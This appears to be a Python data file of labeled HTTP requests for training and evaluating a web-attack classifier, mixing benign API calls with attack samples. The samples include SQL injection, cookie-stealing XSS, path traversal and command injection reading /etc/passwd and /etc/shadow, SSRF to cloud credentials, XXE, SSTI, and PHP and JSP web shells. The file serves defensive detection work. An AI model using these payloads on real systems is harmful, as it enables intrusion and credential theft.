"""
PREVENT-X ML Traffic Classification - Documented Benchmark Dataset
Contains labeled HTTP request samples across legitimate SMB traffic and diverse attack classes.
Split into 70% training and 30% evaluation holdout for genuine model metric computation.
"""

from typing import Any, Dict, List

DOCUMENTED_BENCHMARK_DATASET: List[Dict[str, Any]] = [
    # --- Benign HTTP Requests (Class: "BENIGN", Label: 0) ---
    {"method": "GET", "path": "/api/v1/products", "query": "category=electronics&page=1&limit=20", "body": "", "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/customers/CUST-1092", "query": "", "body": "", "headers": {"Accept": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/invoices", "query": "status=PAID&year=2026", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/cart/items", "query": "", "body": '{"product_id": 401, "quantity": 2, "color": "blue"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/feedback", "query": "", "body": '{"name": "Ananya Sharma", "rating": 5, "comments": "Prompt delivery and great quality"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/inventory", "query": "warehouse=mumbai-hub&in_stock=true", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/auth/login", "query": "", "body": '{"email": "user@alphacorp.in", "password": "UserPass123!"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/support/tickets", "query": "priority=HIGH&assigned=me", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "PUT", "path": "/api/v1/profile/notifications", "query": "", "body": '{"email_alerts": true, "sms_alerts": false}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/reports/monthly-sales", "query": "month=10&year=2026&format=pdf", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/vendors", "query": "state=Karnataka&verified=true", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/orders/ORD-8821/notes", "query": "", "body": '{"note": "Customer requested delivery before 5 PM"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/assets", "query": "type=laptop&department=engineering", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/newsletter/subscribe", "query": "", "body": '{"email": "newsletter@domain.com"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/health", "query": "", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/categories", "query": "parent=apparel", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/checkout/calculate-tax", "query": "", "body": '{"subtotal": 1500.0, "state_code": "KA", "postal_code": "560001"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/discounts", "query": "promo=DIWALI2026", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "PUT", "path": "/api/v1/users/me/theme", "query": "", "body": '{"theme": "dark_cyber", "compact_sidebar": true}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/shipping/tracking", "query": "awb=BLUEDART9921827", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/documents", "query": "type=invoice&sort=date_desc", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/messages/send", "query": "", "body": '{"recipient": "finance@alphacorp.in", "subject": "Quarterly Audit"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/ledger", "query": "account=4001&period=2026-Q1", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},
    {"method": "POST", "path": "/api/v1/employees/search", "query": "", "body": '{"department": "HR", "status": "ACTIVE"}', "headers": {"Content-Type": "application/json"}, "label": 0, "class": "BENIGN"},
    {"method": "GET", "path": "/api/v1/catalog/items/892", "query": "currency=INR", "body": "", "headers": {}, "label": 0, "class": "BENIGN"},

    # --- Malicious HTTP Requests (Class: "ATTACK", Label: 1) ---
    {"method": "GET", "path": "/api/v1/products", "query": "id=1' UNION SELECT 1,username,password FROM users--", "body": "", "headers": {}, "label": 1, "class": "SQLI"},
    {"method": "POST", "path": "/api/v1/search", "query": "", "body": '{"query": "admin\' OR \'1\'=\'1\' --"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "SQLI"},
    {"method": "GET", "path": "/api/v1/orders", "query": "order_id=1; DROP TABLE users;--", "body": "", "headers": {}, "label": 1, "class": "SQLI"},
    {"method": "POST", "path": "/api/v1/comment", "query": "", "body": '{"comment": "<script>alert(document.cookie)</script>"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "XSS"},
    {"method": "GET", "path": "/api/v1/profile", "query": "name=<img src=x onerror=javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb24='))>", "body": "", "headers": {}, "label": 1, "class": "XSS"},
    {"method": "GET", "path": "/api/v1/download", "query": "file=../../../../etc/passwd", "body": "", "headers": {}, "label": 1, "class": "PATH_TRAVERSAL"},
    {"method": "GET", "path": "/api/v1/logs", "query": "path=..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts", "body": "", "headers": {}, "label": 1, "class": "PATH_TRAVERSAL"},
    {"method": "POST", "path": "/api/v1/tools/ping", "query": "", "body": '{"target": "127.0.0.1; whoami; cat /etc/shadow"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "CMDI"},
    {"method": "POST", "path": "/api/v1/convert", "query": "", "body": '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "SSRF"},
    {"method": "POST", "path": "/api/v1/xml-parser", "query": "", "body": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "headers": {"Content-Type": "application/xml"}, "label": 1, "class": "XXE"},
    {"method": "POST", "path": "/api/v1/render", "query": "", "body": '{"template": "{{7*7}}${T(java.lang.Runtime).getRuntime().exec(\'id\')}"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "SSTI"},
    {"method": "POST", "path": "/api/v1/auth/login", "query": "", "body": '{"username": {"$gt": ""}, "password": {"$ne": null}}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "NOSQLI"},
    {"method": "GET", "path": "/api/v1/redirect", "query": "url=//evil-attacker-phishing.com/login", "body": "", "headers": {}, "label": 1, "class": "OPEN_REDIRECT"},
    {"method": "POST", "path": "/api/v1/execute", "query": "", "body": '{"command": "powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA=="}', "headers": {}, "label": 1, "class": "CMDI"},
    {"method": "GET", "path": "/.env", "query": "dump=true", "body": "", "headers": {}, "label": 1, "class": "RECON"},
    {"method": "GET", "path": "/wp-admin/install.php", "query": "", "body": "", "headers": {}, "label": 1, "class": "RECON"},
    {"method": "POST", "path": "/api/v1/graphql", "query": "", "body": '{"query": "{ __schema { types { name fields { name } } } }"}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "GRAPHQL_ABUSE"},
    {"method": "POST", "path": "/api/v1/admin/users", "query": "", "body": '{"username": "hacker", "role": "SUPER_ADMIN", "is_admin": true, "permissions": ["*"]}', "headers": {"Content-Type": "application/json"}, "label": 1, "class": "MASS_ASSIGNMENT"},
    {"method": "GET", "path": "/actuator/heapdump", "query": "", "body": "", "headers": {}, "label": 1, "class": "RECON"},
    {"method": "POST", "path": "/api/v1/shell.php", "query": "", "body": '<?php system($_GET["cmd"]); ?>', "headers": {}, "label": 1, "class": "WEBSHELL"},
    {"method": "GET", "path": "/api/v1/export", "query": "query=1; WAITFOR DELAY '0:0:5'--", "body": "", "headers": {}, "label": 1, "class": "SQLI"},
    {"method": "POST", "path": "/api/v1/upload", "query": "name=shell.jsp", "body": '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', "headers": {}, "label": 1, "class": "RCE"},
    {"method": "GET", "path": "/api/v1/query", "query": "filter=(&(objectClass=user)(uid=*))(|(uid=*))", "body": "", "headers": {}, "label": 1, "class": "LDAP_INJECTION"},
    {"method": "GET", "path": "/api/v1/view", "query": "doc=....//....//etc/passwd", "body": "", "headers": {}, "label": 1, "class": "PATH_TRAVERSAL"},
    {"method": "POST", "path": "/api/v1/auth/jwt", "query": "", "body": '{"token": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."}', "headers": {}, "label": 1, "class": "JWT_MISUSE"},
]
